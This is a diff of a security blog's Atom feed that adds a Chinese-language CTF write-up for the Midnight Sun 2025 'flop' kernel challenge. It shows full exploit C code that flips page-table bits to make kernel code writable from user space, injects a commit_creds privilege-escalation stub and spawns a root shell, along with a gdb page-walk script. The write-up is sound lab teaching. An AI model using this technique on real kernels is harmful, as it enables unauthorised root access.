@@ -1,4 +1,278 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://www.cameudis.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cameudis.com/" rel="alternate" type="text/html" /><updated>2025-10-09T12:50:43+08:00</updated><id>https://www.cameudis.com/feed.xml</id><title type="html">Y² 的博客</title><subtitle>计算机、安全和其他</subtitle><entry><title type="html">Kernel: 环境配置</title><link href="https://www.cameudis.com/2025/09/28/Kernel-0.html" rel="alternate" type="text/html" title="Kernel: 环境配置" /><published>2025-09-28T00:00:00+08:00</published><updated>2025-09-28T00:00:00+08:00</updated><id>https://www.cameudis.com/2025/09/28/Kernel-0</id><content type="html" xml:base="https://www.cameudis.com/2025/09/28/Kernel-0.html"><![CDATA[<ul>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://www.cameudis.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cameudis.com/" rel="alternate" type="text/html" /><updated>2025-10-11T19:46:26+08:00</updated><id>https://www.cameudis.com/feed.xml</id><title type="html">Y² 的博客</title><subtitle>计算机、安全和其他</subtitle><entry><title type="html">Midnight Sun CTF 2025 Final - flop</title><link href="https://www.cameudis.com/2025/10/11/MidnightSunFinal-2025-Flop.html" rel="alternate" type="text/html" title="Midnight Sun CTF 2025 Final - flop" /><published>2025-10-11T00:00:00+08:00</published><updated>2025-10-11T00:00:00+08:00</updated><id>https://www.cameudis.com/2025/10/11/MidnightSunFinal-2025-Flop</id><content type="html" xml:base="https://www.cameudis.com/2025/10/11/MidnightSunFinal-2025-Flop.html"><![CDATA[<h2 id="题目分析">题目分析</h2>
+
+<p>由于在网上搜不到题目附件，不得不手动搭了一个环境，内核版本为 <code class="language-plaintext highlighter-rouge">6.12.27</code>，关闭 <code class="language-plaintext highlighter-rouge">KASLR</code>、<code class="language-plaintext highlighter-rouge">KPTI</code> 保护。</p>
+
+<p>题目添加了一个自定义的系统调用：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/syscalls.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/mm.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/sched.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;asm/uaccess.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;asm/pgtable.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#DEFINE SYS_FLOP 468
+</span>
+<span class="k">static</span> <span class="n">atomic_t</span> <span class="n">bit_flipped</span> <span class="o">=</span> <span class="n">ATOMIC_INIT</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="n">SYSCALL_DEFINE2</span><span class="p">(</span><span class="n">flop</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="n">bit_pos</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">target</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">atomic_cmpxchg</span><span class="p">(</span><span class="o">&amp;</span><span class="n">bit_flipped</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EPERM</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">bit_pos</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">bit_pos</span> <span class="o">&gt;=</span> <span class="mi">64</span><span class="p">)</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">)</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&gt;</span> <span class="n">__pa</span><span class="p">(</span><span class="n">high_memory</span><span class="p">))</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">)</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+
+    <span class="n">target</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">__va</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="o">*</span><span class="n">target</span> <span class="o">&amp;</span> <span class="n">_PAGE_PRESENT</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">*</span><span class="n">target</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+
+    <span class="o">*</span><span class="n">target</span> <span class="o">^=</span> <span class="p">(</span><span class="mi">1UL</span> <span class="o">&lt;&lt;</span> <span class="n">bit_pos</span><span class="p">);</span>
+    <span class="n">__flush_tlb_all</span><span class="p">();</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>总结来说，这个系统调用允许攻击者在满足下列条件的情况下，有一次翻转一个 bit 的机会：</p>
+<ul>
+  <li>地址范围在 <code class="language-plaintext highlighter-rouge">0x1000</code> ~ <code class="language-plaintext highlighter-rouge">high_memory</code> 且向 8 对齐</li>
+  <li>目标地址的值要么是 <code class="language-plaintext highlighter-rouge">0</code> 要么最低位为 <code class="language-plaintext highlighter-rouge">1</code> （即 <code class="language-plaintext highlighter-rouge">_PAGE_PRESENT</code>）</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">high_memory</code> 是一个用来标识直接映射区顶端的变量，这里就是在暗示我们攻击直接映射区的内存。另外代码中出现了 <code class="language-plaintext highlighter-rouge">_PAGE_PRESENT</code>、<code class="language-plaintext highlighter-rouge">__flush_tlb_all</code>，显然是在暗示我们修改页表（修改页表作为一种攻击手法，是本博客的老熟人了，详见 <a href="https://www.cameudis.com/2025/01/06/GhostWrite-2.html#%E4%BB%BB%E6%84%8F%E8%AF%BB%E6%94%BB%E5%87%BB">GhostWrite #2: 漏洞利用代码分析</a>）。</p>
+
+<h2 id="利用">利用</h2>
+
+<p>一个页表项的结构大致如下（这是最后一级 Page Table Entry 的格式，但其他几级也差不多，可见 linux 源码 <code class="language-plaintext highlighter-rouge">/arch/x86/64/include/paging_definitions.h</code>）：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span>
+<span class="p">{</span>
+  <span class="n">uint64</span> <span class="n">present</span>                   <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">writeable</span>                 <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">user_access</span>               <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">write_through</span>             <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">cache_disabled</span>            <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">accessed</span>                  <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">dirty</span>                     <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">size</span>                      <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">global</span>                    <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">ignored_2</span>                 <span class="o">:</span><span class="mi">3</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">page_ppn</span>                  <span class="o">:</span><span class="mi">28</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">reserved_1</span>                <span class="o">:</span><span class="mi">12</span><span class="p">;</span> <span class="c1">// must be 0</span>
+  <span class="n">uint64</span> <span class="n">ignored_1</span>                 <span class="o">:</span><span class="mi">11</span><span class="p">;</span>
+  <span class="n">uint64</span> <span class="n">execution_disabled</span>        <span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">__packed__</span><span class="p">))</span> <span class="n">PageTableEntry</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>其中，<code class="language-plaintext highlighter-rouge">writeable</code> 和 <code class="language-plaintext highlighter-rouge">user_access</code> 比较重要，前者标记页面是否可写，后者标记页面是否可以在用户态被访问。在一次虚拟地址转化为物理地址的过程中，会涉及到多层的页表，只要其中有一层的权限要求不满足，就会触发 page fault。</p>
+
+<h3 id="方法1劫持内核代码">方法1：劫持内核代码</h3>
+
+<p>我们可以修改页表，那么首先就可以考虑注入恶意代码，此在 <a href="https://www.cameudis.com/2023/11/29/HITCTF2023-xv6-Trusted.html">HITCTF 2023 xv6-Trusted</a> 中亦有记载。为了让恶意代码在内核态被执行，我们可以挑选一个内核中的函数进行劫持，然后从用户态触发这个函数的调用。由于题目没有开启 KPTI 保护（这一点很关键！），我们可以在劫持页表权限后，直接从用户态攻击内核的代码段。</p>
+
+<p>不妨就以 <code class="language-plaintext highlighter-rouge">__x64_sys_flop</code> 为目标，尝试把其代码覆盖掉。为此，我们需要获取其地址以及各级对应的页表（这里用到的 <code class="language-plaintext highlighter-rouge">va2pa</code> 函数在文末附上了）：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(qemu) gef➤  x/i __x64_sys_flop 
+   0xffffffff810a4070 &lt;__x64_sys_flop&gt;: endbr64
+(qemu) gef➤  va2pa 0xffffffff810a4070
+pml4e: 0x0000000001e2f067 at 0x03778ff8
+pdpte: 0x0000000001e30063 at 0x01e2fff0
+pde  : 0x00000000010001a1 at 0x01e30040
+phy  : 0x10a4070 [0x01000000-0x011fffff]
+</code></pre></div></div>
+
+<blockquote>
+  <p>Q：为什么这里只有三级而不是四级页表？
+A：PDE 的第 7 位为 1，表明这是一个 2MB 大页描述符，没有第四级页表。</p>
+</blockquote>
+
+<p>注意到，这里 <code class="language-plaintext highlighter-rouge">pdpte</code> 的配置是用户不可读、内核可读写；<code class="language-plaintext highlighter-rouge">pde</code> 的配置是用户不可读、内核可读。因此，如果想在用户态写入 <code class="language-plaintext highlighter-rouge">__x64_sys_flop</code>，一共需要修改三个 bits，分别使 <code class="language-plaintext highlighter-rouge">pdpte</code> 变成用户可访问、<code class="language-plaintext highlighter-rouge">pde</code> 变成用户可访问和可写入。我们具备的条件不足以修改三个 bits，因此这条路行不通。</p>
+
+<p>好在，我们知道这个函数除了在内核代码映射区内会被映射，还会同时存在于线性映射区域（直接映射区域）。从上可知 <code class="language-plaintext highlighter-rouge">__x64_sys_flop</code> 的物理地址是 <code class="language-plaintext highlighter-rouge">0x10a4070</code>，对应直接映射区地址是 <code class="language-plaintext highlighter-rouge">0xffff8880010a4070</code>，我们再来解析一下这个虚拟地址：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(qemu) gef➤  va2pa 0xffff8880010a4070
+pml4e: 0x0000000002201067 at 0x03778888
+pdpte: 0x0000000002202067 at 0x02201000
+pde  : 0x80000000010001a1 at 0x02202040
+phy  : 0x10a4070 [0x01000000-0x011fffff]
+</code></pre></div></div>
+
+<p>可以看到，这次我们需要修改 <code class="language-plaintext highlighter-rouge">pde</code> 的两个比特才能将这个映射变成用户可写。聪明的内核开发者对直接映射区做了保护，把里面属于代码的部分标记成不可写了！但是没关系，我们考虑 <code class="language-plaintext highlighter-rouge">pde</code> 本身，其作为数据（而非代码）也会在线性映射区中存在一个映射，而数据的映射则大概率是 <code class="language-plaintext highlighter-rouge">rw</code> 的：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(qemu) gef➤  va2pa 0xffff888002202040
+pml4e: 0x0000000002201067 at 0x03778888
+pdpte: 0x0000000002202067 at 0x02201000
+pde  : 0x80000000022001e3 at 0x02202088
+phy  : 0x2202040 [0x02200000-0x023fffff]
+</code></pre></div></div>
+
+<p>可以看到，这里确实只需要修改一个比特就可以从用户劫持了。由此我们得到了完整的攻击流程：</p>
+
+<ol>
+  <li>利用题目给出的条件，攻击目标（<code class="language-plaintext highlighter-rouge">__x64_sys_flop</code>） 在线性映射区的映射的 <code class="language-plaintext highlighter-rouge">pde</code> 部分在线性映射区的映射（也就是 <code class="language-plaintext highlighter-rouge">pde</code> 的 <code class="language-plaintext highlighter-rouge">pde</code>，套娃），将目标的 <code class="language-plaintext highlighter-rouge">pde</code> 变成用户可访问；</li>
+  <li>从用户态直接攻击目标在线性映射区映射的 <code class="language-plaintext highlighter-rouge">pde</code>，将目标变为用户可访问、可写；</li>
+  <li>从用户态直接劫持目标函数；</li>
+  <li>触发目标函数的调用。</li>
+</ol>
+
+<p>攻击代码如下：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"kernelpwn.h"</span><span class="cp">
+</span>
+<span class="cp">#define INIT_CRED "0xffffffff81e3ab80"
+#define COMMIT_CREDS "0xffffffff810a02f0"
+</span>
+<span class="kt">void</span> <span class="nf">rootkit</span><span class="p">();</span>
+<span class="n">asm</span><span class="p">(</span>
+    <span class="s">"rootkit:"</span>
+    <span class="s">"mov rdi, 0xffffffff81e3ab80;"</span>
+    <span class="s">"mov rax, 0xffffffff810a02f0;"</span>
+    <span class="s">"call rax;"</span>
+    <span class="s">"ret;"</span>
+<span class="p">);</span>
+<span class="kt">void</span> <span class="nf">rootkit_end</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span><span class="p">;</span> <span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="c1">// high_memory: 0xffff88800ffe0000</span>
+    <span class="c1">// range: 0x1000 ~ 0xffe0000</span>
+
+    <span class="c1">// __x64_sys_flop 0xffff8880010a4070</span>
+    <span class="c1">//   corresponding pte addr: 0x02202040 (v: 0xffff888002202040)</span>
+    <span class="c1">//   ^ corresponding pte addr: 0x02202088 (v: 0xffff888002202088)</span>
+
+    <span class="n">syscall</span><span class="p">(</span><span class="mi">468</span><span class="p">,</span> <span class="mh">0x2202088</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+
+    <span class="kt">uint64_t</span><span class="o">*</span> <span class="n">flop_pte</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffff888002202040</span><span class="p">;</span>
+    <span class="o">*</span><span class="n">flop_pte</span> <span class="o">|=</span> <span class="mi">6</span><span class="p">;</span>
+    <span class="c1">// sched_yield();</span>
+
+    <span class="kt">void</span><span class="o">*</span> <span class="n">flop</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffff8880010a4070</span><span class="p">;</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">flop</span><span class="p">,</span> <span class="n">rootkit</span><span class="p">,</span> <span class="n">rootkit_end</span> <span class="o">-</span> <span class="n">rootkit</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="mi">468</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] syscall return: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span> <span class="c1">// BOOM!</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>如果题目没有开启 <code class="language-plaintext highlighter-rouge">SMAP</code> 保护的话，现在我们已经成功拿到 shell 了。不过，如果此时开启了 <code class="language-plaintext highlighter-rouge">SMAP</code>，有几率会在内核处理 <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> 或更之后的时候发生 panic，报错大致如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BUG: unable to handle page fault for address: ffff888002363000
+#PF: supervisor read access in kernel mode
+#PF: error_code(0x0001) - permissions violation
+PGD 2201067 P4D 2201067
+</code></pre></div></div>
+
+<p>这是因为我们把直接映射区的两个大页改成了用户可访问，内核去读写那里的数据时，就会被 <code class="language-plaintext highlighter-rouge">SMAP</code> 拦下。解决方法就是在攻击完毕之后进行清理，只需要在最后的 <code class="language-plaintext highlighter-rouge">system</code> 前添加下面这两行代码即可：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">// recover page table</span>
+    <span class="o">*</span><span class="n">flop_pte</span> <span class="o">^=</span> <span class="mi">6</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffff888002202088</span> <span class="o">^=</span> <span class="mi">4</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>就可以成功拿到 flag：</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~ <span class="nv">$ </span>./exp
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> syscall <span class="k">return</span>: 0
+~ <span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+~ <span class="c"># cat /flag</span>
+flag<span class="o">{</span>你怎么知道cameudis有对象了?<span class="o">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>注：有一次调试的时候遇到了挫折（如下图所示，发现直接映射区缺了一块映射），本来以为是内核做了保护把代码段除外了，后来发现疑似是自己 exp 写得有点烂，把页表搞得乱七八糟导致的（）</p>
+
+  <p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/20251010204440251.png" alt="" /></p>
+
+  <p>所以内核是不是可以做一个保护把代码段直接不映射？</p>
+</blockquote>
+
+<h3 id="方法-2搜索-ramdisk-中的-flag-文件todo">方法 2：搜索 ramdisk 中的 flag 文件（TODO）</h3>
+
+<p>由于题目给出的 flag 直接存在于 ramdisk 里，因此也会被加载到内存中。我们可以先在调试环境搜索到 flag 的位置，然后在脚本中暴力搜索周围的内存空间。虽然 flag 的位置有随机性，但由于线性映射区都是大页映射，因此我们可以在修改完 1 个比特之后就开始搜索大页，甚至也可以使用类似于方法 1 中的套娃技巧，将控制范围再度扩大。</p>
+
+<p>不过由于笔者还没装好 <a href="https://github.com/bata24/gef">Kernel特化版gef</a>（这玩意一键安装脚本只支持 debian 系是什么鬼？），默认的 gef 又没办法在 qemu 模式下搜索内存，这种方法就先咕咕咕了！</p>
+
+<hr />
+
+<h2 id="附录">附录</h2>
+
+<p>简陋的 va2ga gdb 脚本（只支持 linux x64 4级页表映射）：</p>
+
+<pre><code class="language-gdb">define phy4pxe
+    if $argc != 1
+        printf "Usage: phy4pxe &lt;pml4e|pdpte|pde|pte&gt;\n"
+    else 
+        set $mask40 = (((unsigned long)1 &lt;&lt; 40)-1)
+        set $result = (($arg0 &gt;&gt; 12) &amp; $mask40) &lt;&lt; 12
+    end
+end
+
+define va2pa
+    set $directmappingbase = 0xffff888000000000
+    set $target = 0xffff888000000000
+    set $mask9  = ((1 &lt;&lt; 9) - 1)
+    set $mask12 = ((1 &lt;&lt; 12) - 1)
+    set $mask21 = ((1 &lt;&lt; 21) - 1)
+    set $mask30 = ((1 &lt;&lt; 30) - 1)
+    set $mask40 = (((unsigned long)1 &lt;&lt; 40) - 1)
+
+    if $argc &gt;= 1
+        set $target = $arg0
+    end
+
+    phy4pxe $cr3
+    set $pml4ephy = $result + (($target &gt;&gt; 39) &amp; $mask9) * 8
+    set $pml4e = *(unsigned long*)($directmappingbase + $pml4ephy)
+    printf "pml4e: 0x%016lx at 0x%08x\n", $pml4e, $pml4ephy
+
+    phy4pxe $pml4e
+    set $pdptephy = $result + (($target &gt;&gt; 30) &amp; $mask9) * 8
+    set $pdpte = *(unsigned long*)($directmappingbase + $pdptephy)
+    printf "pdpte: 0x%016lx at 0x%08x\n", $pdpte, $pdptephy
+
+    phy4pxe $pdpte
+    if (($pdpte &gt;&gt; 7) &amp; 1) == 0
+        set $pdephy = $result + (($target &gt;&gt; 21) &amp; $mask9) * 8
+        set $pde = *(unsigned long*)($directmappingbase + $pdephy)
+        printf "pde  : 0x%016lx at 0x%08x\n", $pde, $pdephy
+
+        phy4pxe $pde
+        if (($pde &gt;&gt; 7) &amp; 1) == 0
+            set $ptephy = $result + (($target &gt;&gt; 12) &amp; $mask9) * 8
+            set $pte = *(unsigned long*)($directmappingbase + $ptephy)
+            printf "pte  : 0x%016lx at 0x%08x\n", $pte, $ptephy
+
+            phy4pxe $pte
+            set $res_mask = $mask12
+        else
+            set $res_mask = $mask21
+        end
+    else
+        set $res_mask = $mask30
+    end
+
+    printf "phy  : 0x%lx [0x%08x-0x%08x]\n", $result + ($target &amp; $res_mask), $result, $result + $res_mask
+end
+</code></pre>]]></content><author><name></name></author><category term="pwn" /><category term="kernel" /><summary type="html"><![CDATA[题目分析]]></summary></entry><entry><title type="html">Kernel: 环境配置</title><link href="https://www.cameudis.com/2025/09/28/Kernel-0.html" rel="alternate" type="text/html" title="Kernel: 环境配置" /><published>2025-09-28T00:00:00+08:00</published><updated>2025-09-28T00:00:00+08:00</updated><id>https://www.cameudis.com/2025/09/28/Kernel-0</id><content type="html" xml:base="https://www.cameudis.com/2025/09/28/Kernel-0.html"><![CDATA[<ul>
   <li>简易版环境： <a href="https://github.com/pwncollege/pwnkernel">pwncollege/pwnkernel: Kernel development &amp; exploitation practice environment. (github.com)</a></li>
   <li>高级版环境：<a href="https://github.com/cirosantilli/linux-kernel-module-cheat">cirosantilli/linux-kernel-module-cheat: The perfect emulation setup to study and develop the Linux kernel v5.4.3, kernel modules, QEMU, gem5 and x86_64, ARMv7 and ARMv8 userland and baremetal assembly, ANSI C, C++ and POSIX. (github.com)</a></li>
 </ul>
@@ -3025,322 +3299,4 @@ empty
 
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
-</code></pre></div></div>]]></content><author><name></name></author><category term="pwn" /><category term="qemu" /><summary type="html"><![CDATA[第一次从qemu里面逃出来，但没有完全逃出来，远程没通比赛就结束了S.H.I.T]]></summary></entry><entry><title type="html">HITCTF 2023 xv6-Trusted</title><link href="https://www.cameudis.com/2023/11/29/HITCTF2023-xv6-Trusted.html" rel="alternate" type="text/html" title="HITCTF 2023 xv6-Trusted" /><published>2023-11-29T09:58:33+08:00</published><updated>2023-11-29T09:58:33+08:00</updated><id>https://www.cameudis.com/2023/11/29/HITCTF2023-xv6-Trusted</id><content type="html" xml:base="https://www.cameudis.com/2023/11/29/HITCTF2023-xv6-Trusted.html"><![CDATA[<p>第一次打内核题，虽然是xv6但还是感觉非常酷。比赛结束前才想到了真的可行的思路，赛后结合官方 writeup 调出来了。</p>
-
-<h2 id="程序分析">程序分析</h2>
-
-<p>本程序由教学操作系统 xv6 改编而来，是一道 RISC-V 内核漏洞利用题。
-在 xv6 中，没有地址随机化机制。但有着页表权限保护，也就是 R/W/X 权限位；并且在 xv6 通过 ecall 进入 supervisor mode 时，会将页表切换到内核页表，从而屏蔽对于用户内存地址的访问。</p>
-
-<p>题目的目标是读出位于内核的数据段中的 flag，出题人贴心地给出了一个 <code class="language-plaintext highlighter-rouge">backdoor</code> 函数来帮我们读出 flag：</p>
-
-<pre><code class="language-RISC-V">.text:000000008000620C                 # public backdoor
-.text:000000008000620C backdoor:
-.text:000000008000620C
-.text:000000008000620C var_s0          =  0
-.text:000000008000620C var_s8          =  8
-.text:000000008000620C arg_0           =  10h
-.text:000000008000620C
-.text:000000008000620C                 addi            sp, sp, -10h
-.text:000000008000620E                 sd              ra, var_s8(sp)
-.text:0000000080006210                 sd              s0, var_s0(sp)
-.text:0000000080006212                 addi            s0, sp, arg_0
-.text:0000000080006214                 li              a0, 80008860h
-.text:0000000080006220                 lui             a1, %hi(10000000h)
-.text:0000000080006224                 li              a2, 0
-.text:0000000080006226                 li              a3, 20h # ' '
-.text:000000008000622A
-.text:000000008000622A loop:                                   # CODE XREF: backdoor+2A↓j
-.text:000000008000622A                 lb              a4, 0(a0)
-.text:000000008000622E                 sb              a4, %lo(10000000h)(a1)
-.text:0000000080006232                 addi            a0, a0, 1
-.text:0000000080006234                 addi            a2, a2, 1
-.text:0000000080006236                 blt             a2, a3, loop
-.text:000000008000623A                 la              a0, aHeyHereIsYourF # "Hey, here is your flag"
-.text:0000000080006242                 call            panic
-.text:0000000080006242 # End of function backdoor
-</code></pre>
-
-<p>但不幸的是，内核中为 flag 所处的内存提供了额外的 PMP（Physical Memory Protection）保护，这里只是简单介绍一下用途，具体细节可以去阅读 RISC-V 特权手册（<a href="https://github.com/riscv/riscv-isa-manual">riscv/riscv-isa-manual: RISC-V Instruction Set Manual</a>）的对应章节（位于 Machine-Level ISA, Version 1.12 中）。</p>
-
-<p>在 RISC-V 中有三种权限等级：通常机器启动时处于 <strong>machine mode</strong>、内核运行在 <strong>supervisor mode</strong>、用户程序运行在 <strong>user mode</strong>。
-PMP 是一种由 <strong>machine mode</strong> 进行设置和修改的保护，可以给某段内存设置可读、可写、可执行等权限，并对 <strong>supervisor mode</strong> 和 <strong>user mode</strong> 生效。</p>
-
-<p>在 <code class="language-plaintext highlighter-rouge">start</code> 函数中，内核为 flag 所在内存添加了不可读、不可写、不可执行的权限保护：</p>
-
-<pre><code class="language-RISC-V">.text:00000000800000D8                 la              a5, flag # "HITCTF2023{true_flag_on_server}"
-.text:00000000800000E0                 srli            a5, a5, 2
-.text:00000000800000E2                 ori             a5, a5, 3
-.text:00000000800000E6                 csrw            pmpaddr0, a5
-.text:00000000800000EA                 csrw            pmpaddr1, a4
-.text:00000000800000EE                 li              a5, -1
-.text:00000000800000F0                 srli            a5, a5, 0Ah
-.text:00000000800000F2                 csrw            pmpaddr2, a5
-.text:00000000800000F6                 li              a5, 0F0018h
-.text:00000000800000FC                 csrw            pmpcfg0, a5
-</code></pre>
-
-<p>因此，就算我们直接在内核中调用 backdoor 函数，也只能看到一个报错而不是 Flag。（做题的时候以为马上出 flag 了，然后就遇到了禁止访问的报错，一时很难绷住）
-我们想要读出 flag，就一定需要处于 machine mode 中，或者在 machine mode 中将保护关闭，但可以通过搜索 <code class="language-plaintext highlighter-rouge">pmpaddr</code> 的方法发现程序本身并没有提供关闭保护的功能（</p>
-
-<h2 id="漏洞分析">漏洞分析</h2>
-
-<p>第一个比较明显的漏洞，就是新添加的系统调用 <code class="language-plaintext highlighter-rouge">sys_encrypt</code> 中存在的栈溢出漏洞，官方 wp 中提供的函数源码：</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">uint64</span> <span class="nf">sys_encrypt</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>  
-    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>  
-    <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>  
-    <span class="n">uint</span> <span class="n">l</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  
-    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">src</span><span class="p">;</span>  
-    <span class="n">uint</span> <span class="n">srclen</span><span class="p">;</span>  
-    <span class="kt">char</span><span class="o">*</span> <span class="n">dst</span><span class="p">;</span>  
-    <span class="n">uint</span> <span class="n">dstlen</span><span class="p">;</span>  
-    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">keyva</span><span class="p">;</span>  
-    <span class="n">uint</span> <span class="n">keylen</span><span class="p">;</span>  
-    <span class="k">struct</span> <span class="n">proc</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">myproc</span><span class="p">();</span>  
-    <span class="n">argaddr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">src</span><span class="p">);</span>  
-    <span class="n">argint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">srclen</span><span class="p">);</span>  
-    <span class="n">argaddr</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dst</span><span class="p">);</span>  
